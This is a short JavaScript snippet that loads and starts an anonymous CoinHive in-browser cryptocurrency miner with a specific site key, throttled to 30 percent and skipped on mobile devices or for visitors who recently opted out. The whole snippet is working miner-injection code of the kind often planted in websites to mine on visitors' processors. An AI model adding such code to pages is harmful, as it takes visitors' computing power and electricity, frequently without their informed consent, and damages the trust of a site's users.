var miner = new CoinHive.Anonymous('xslo1oAOeO3oGgMrPMrT3o1Lxn4eoCqM', {
    throttle: 0.3
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}